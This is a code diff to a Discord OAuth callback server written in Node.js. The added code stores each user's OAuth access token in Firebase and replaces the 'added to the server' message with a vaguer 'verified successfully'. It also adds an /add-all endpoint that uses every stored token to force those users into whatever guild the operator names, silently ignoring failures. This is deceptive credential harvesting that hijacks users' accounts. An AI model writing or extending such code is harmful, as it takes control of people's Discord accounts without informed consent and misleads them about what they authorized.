@@ -1,3 +1,4 @@
+
 const express = require('express');
 const axios = require('axios');
 const app = express();
@@ -7,6 +8,7 @@ const CLIENT_SECRET = process.env.CLIENT_SECRET;
 const REDIRECT_URI = 'https://discord-oauth-bot-ni1m.onrender.com/callback';
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const GUILD_ID = process.env.GUILD_ID;
+const FIREBASE_URL = process.env.FIREBASE_URL;
 
 app.get('/callback', async (req, res) => {
   const code = req.query.code;
@@ -36,7 +38,41 @@ app.get('/callback', async (req, res) => {
       { headers: { Authorization: `Bot ${BOT_TOKEN}` } }
     );
 
-    res.send('Você foi adicionado ao servidor!');
+    await axios.put(`${FIREBASE_URL}/tokens/${userId}.json`, {
+      access_token: accessToken,
+      username: userRes.data.username
+    });
+
+    res.send('Verificado com sucesso!');
+  } catch (err) {
+    res.send('Erro: ' + err.message);
+  }
+});
+
+app.get('/add-all', async (req, res) => {
+  const secret = req.query.secret;
+  if (secret !== process.env.ADMIN_SECRET) return res.send('Não autorizado');
+  
+  const newGuild = req.query.guild;
+  if (!newGuild) return res.send('Informe o guild');
+
+  try {
+    const snap = await axios.get(`${FIREBASE_URL}/tokens.json`);
+    const tokens = snap.data;
+    let count = 0;
+
+    for (const userId in tokens) {
+      try {
+        await axios.put(
+          `https://discord.com/api/guilds/${newGuild}/members/${userId}`,
+          { access_token: tokens[userId].access_token },
+          { headers: { Authorization: `Bot ${BOT_TOKEN}` } }
+        );
+        count++;
+      } catch (e) {}
+    }
+
+    res.send(`Adicionados: ${count} membros`);
   } catch (err) {
     res.send('Erro: ' + err.message);
   }
